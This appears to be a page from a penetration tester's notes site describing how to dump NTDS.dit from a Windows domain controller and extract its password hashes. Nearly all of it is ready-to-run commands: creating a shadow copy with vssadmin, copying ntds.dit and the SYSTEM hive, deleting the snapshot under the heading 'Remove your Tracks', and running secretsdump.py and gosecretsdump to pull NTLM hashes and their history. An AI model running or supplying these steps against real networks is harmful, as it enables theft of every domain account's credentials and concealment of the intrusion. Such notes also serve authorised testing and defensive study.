---
title : "NTDS.dit Dump & Extract"
# pre : ' '
description : "How to dump NTDS.dit and extract the hashes with ShadowCopy and Secretsdump."
date : 2022-01-18T10:07:23+01:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## NTDS.dit Dump&Extract

On Domain Controller - create snapshot with `vssadmin.exe`.

### Step 1 - Create ShadowCopy

```plain
PS C:\temp> vssadmin.exe create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
```

### Step 2 - Copy NTDS.dit from ShadowCopy

```plain
PS C:\temp> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\temp\ntds.dit
```

You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html) if you prefer a GUI.

{{%attachments fa_icon_class="far fa-file-archive" pattern=".*(zip)"/%}}

### Step 3 - Remove your Tracks

```plain
PS C:\temp> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
```

### Step 4 - Save the SYSTEM file

Save the `SYSTEM` file.

```plain
reg SAVE HKLM\SYSTEM c:\temp\SYSTEM
```

## Extract hashes

It can happen that [secretsdump.py]({{< ref"secretsdump-py" >}}) keeps looping and throwing out hashes. In this case, or maybe even preferably, use [Gosecretsdump]({{< ref "gosecretsdump" >}}).

### Secretsdump.py

```plain
secretsdump.py -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile extracted-hashes -just-dc-ntlm -user-status -history
```

### Gosecretsdump

```plain
./gosecretsdump -system SYSTEM -ntds NTDS.DIT -history -status -out hashes.log
```

### Example NTDS/SYSTEM

Example `NTDS.dit` and `SYSTEM` files zipped below.

{{%attachments fa_icon_class="far fa-file" pattern=".*(NTDS.DIT-SYSTEM)"/%}}

## URL List

- [Stealthbits.com - Extracting Password Hashes from the Ntds.dit File](https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/)
